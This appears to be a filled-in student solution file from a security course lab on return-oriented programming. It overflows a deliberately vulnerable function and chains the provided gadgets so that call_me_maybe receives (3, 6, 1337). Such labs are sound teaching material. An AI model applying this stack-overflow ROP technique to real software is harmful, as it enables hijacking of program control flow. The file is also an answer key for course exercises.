/*
 * Address Space Layout Randomization
 * Part 2B: ROP
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include "lab.h"

// No win method this time!
extern void vulnerable(char *your_string);

// Call this via a ROP chain to win:
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Here's some gadgets for you (see gadgets.s):
extern void gadget1();
extern void gadget2();
extern void gadget3();
extern void gadget4();
extern void gadget5();
extern void gadget6();

/*
 * lab_code
 * Your code for part 1 goes here!
 */
void lab_code() {
    // Same deal as Part 2A, except this time there's no win() method to call directly!
    uint64_t your_string[128];

    // Fill the array with 0xFF's and set the last character to be a new line.
    memset(your_string, 0xFF, sizeof(your_string));
    your_string[127] = 0x000000000000000A;

    // For now we don't worry about ASLR, we can directly use these addresses:
    uint64_t gadget1_addr = (uint64_t)&gadget1;
    uint64_t gadget2_addr = (uint64_t)&gadget2;
    uint64_t gadget3_addr = (uint64_t)&gadget3;
    uint64_t gadget4_addr = (uint64_t)&gadget4;
    uint64_t gadget5_addr = (uint64_t)&gadget5;
    uint64_t gadget6_addr = (uint64_t)&gadget6;
    uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;

    /*
     * Goal: reach call_me_maybe(rdi, rsi, rdx) with:
     *   rdi having bit 1 set,
     *   rsi == 2 * rdi,
     *   rdx == 1337.
     *
     * ROP chain after the overflow:
     *   gadget3          => rdi = 0
     *   gadget5 x3       => rdi = 3
     *   gadget6          => rsi = rdi = 3
     *   gadget2          => rsi = 6
     *   gadget1          => rax = 191 (popped from next stack slot)
     *   gadget4          => rdx = rax * 7 = 1337
     *   call_me_maybe    => checks (3, 6, 1337)
     *
     * The first three qwords are still padding up to the saved RIP.
     */
    your_string[0] = 0xFFFFFFFFFFFFFFFF;
    your_string[1] = 0xFFFFFFFFFFFFFFFF;
    your_string[2] = 0xFFFFFFFFFFFFFFFF;
    your_string[3] = gadget3_addr;
    your_string[4] = gadget5_addr;
    your_string[5] = gadget5_addr;
    your_string[6] = gadget6_addr;
    your_string[7] = gadget2_addr;
    your_string[8] = gadget1_addr;
    your_string[9] = 191;
    your_string[10] = gadget4_addr;
    your_string[11] = call_me_maybe_addr;

    // Once vulnerable() returns, execution walks this chain one gadget at a time.
    vulnerable((char *)your_string);
}
